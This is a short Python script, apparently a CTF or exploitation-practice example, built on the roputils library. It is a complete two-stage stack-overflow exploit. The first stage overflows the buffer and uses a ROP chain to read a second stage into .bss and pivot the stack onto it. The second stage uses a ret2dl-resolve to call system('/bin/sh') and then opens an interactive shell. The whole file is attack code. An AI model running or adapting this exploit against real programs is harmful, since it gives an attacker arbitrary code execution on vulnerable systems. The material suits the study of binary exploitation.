from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)

addr_stage = rop.section('.bss') + 0x800

buf = rop.fill(offset)
buf += rop.call_plt('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.dl_resolve(addr_stage, 'system', addr_stage + 59)
print "[+] offset to string: %d" % len(buf)
buf += rop.string('/bin/sh')
buf += rop.fill(100, buf)

p.write(buf)
p.interact()